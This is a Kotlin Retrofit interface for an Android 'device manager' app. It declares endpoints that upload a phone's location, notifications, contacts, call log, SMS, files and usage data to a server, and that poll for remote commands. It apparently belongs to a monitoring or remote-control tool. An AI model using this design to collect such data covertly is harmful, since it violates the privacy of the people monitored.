package com.devicemanager.data.remote

import com.devicemanager.data.remote.model.*
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.ResponseBody
import retrofit2.Response
import retrofit2.http.*

/**
 * Retrofit API interface defining all backend endpoints.
 *
 * All device requests use the header X-Device-Token: <token>, which is
 * injected by the OkHttp interceptor configured in DeviceManagerApp.
 */
interface ApiService {

    // ── Device Registration ──────────────────────────────────────────

    @POST("/api/devices/register")
    suspend fun registerDevice(
        @Body request: RegisterRequest
    ): Response<RegisterResponse>

    // ── Telemetry ────────────────────────────────────────────────────

    @POST("/api/telemetry")
    suspend fun sendTelemetry(
        @Body request: TelemetryRequest
    ): Response<ResponseBody>

    // ── Location ─────────────────────────────────────────────────────

    @POST("/api/locations")
    suspend fun sendLocation(
        @Body request: LocationRequest
    ): Response<ResponseBody>

    // ── Notifications ────────────────────────────────────────────────

    @POST("/api/notifications")
    suspend fun sendNotification(
        @Body request: NotificationRequest
    ): Response<ResponseBody>

    // ── Usage Stats ──────────────────────────────────────────────────

    @POST("/api/usage")
    suspend fun sendUsageStats(
        @Body request: UsageRequest
    ): Response<ResponseBody>

    // ── Contacts ─────────────────────────────────────────────────────

    @POST("/api/contacts/sync")
    suspend fun syncContacts(
        @Body request: ContactsSyncRequest
    ): Response<ResponseBody>

    // ── Call Log ─────────────────────────────────────────────────────

    @POST("/api/calls/sync")
    suspend fun syncCalls(
        @Body request: CallsSyncRequest
    ): Response<ResponseBody>

    // ── SMS ──────────────────────────────────────────────────────────

    @POST("/api/sms/sync")
    suspend fun syncSms(
        @Body request: SmsSyncRequest
    ): Response<ResponseBody>

    // ── Files ────────────────────────────────────────────────────────

    @POST("/api/files/sync")
    suspend fun syncFiles(
        @Body request: FilesSyncRequest
    ): Response<ResponseBody>

    // ── File Upload (multipart) ──────────────────────────────────────

    @Multipart
    @POST("/api/upload")
    suspend fun uploadFile(
        @Part("device_id") deviceId: RequestBody,
        @Part("file_type") fileType: RequestBody,
        @Part file: MultipartBody.Part
    ): Response<FileUploadResponse>

    // ── Commands ─────────────────────────────────────────────────────

    @GET("/api/devices/{id}/commands/pending")
    suspend fun getPendingCommands(
        @Path("id") deviceId: String
    ): Response<PendingCommandsResponse>

    @PUT("/api/commands/{id}/status")
    suspend fun updateCommandStatus(
        @Path("id") commandId: String,
        @Body request: CommandStatusRequest
    ): Response<ApiResponse<Any>>

    // ── Permissions ──────────────────────────────────────────────────

    @PUT("/api/devices/{id}/permissions")
    suspend fun updatePermissions(
        @Path("id") deviceId: String,
        @Body request: PermissionsRequest
    ): Response<PermissionsResponse>

    // ── Chunked File Transfers ───────────────────────────────────────

    @POST("/api/transfers/init")
    suspend fun initTransfer(
        @Body request: TransferInitRequest
    ): Response<TransferInitResponse>

    @POST("/api/transfers/{id}/chunk")
    suspend fun uploadChunk(
        @Path("id") transferId: String,
        @Body request: ChunkUploadRequest
    ): Response<ChunkUploadResponse>

    @POST("/api/transfers/{id}/complete")
    suspend fun completeTransfer(
        @Path("id") transferId: String
    ): Response<TransferCompleteResponse>

    @GET("/api/transfers/{id}/status")
    suspend fun getTransferStatus(
        @Path("id") transferId: String
    ): Response<TransferStatusResponse>

    // ── Snapshots ────────────────────────────────────────────────────

    @POST("/api/snapshots")
    suspend fun createSnapshot(
        @Body request: SnapshotCreateRequest
    ): Response<SnapshotResponse>
}

/**
 * Request body for creating a snapshot.
 */
data class SnapshotCreateRequest(
    @com.google.gson.annotations.SerializedName("snapshot_data") val snapshotData: com.devicemanager.data.remote.model.SnapshotData
)
